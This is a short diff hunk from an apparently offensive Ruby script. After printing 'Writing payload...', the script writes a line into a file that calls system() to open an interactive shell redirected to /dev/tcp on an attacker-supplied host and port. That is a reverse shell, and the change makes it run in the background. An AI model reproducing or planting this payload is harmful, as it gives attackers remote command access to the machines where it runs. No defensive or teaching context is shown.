@@ -44,5 +44,5 @@ sleep(0.5)
 puts "#{g}Writing payload..."
 sleep(1)
 open(file, 'w') { |f|
-    f.puts "system('#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1')"
+    f.puts "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\")"
 }
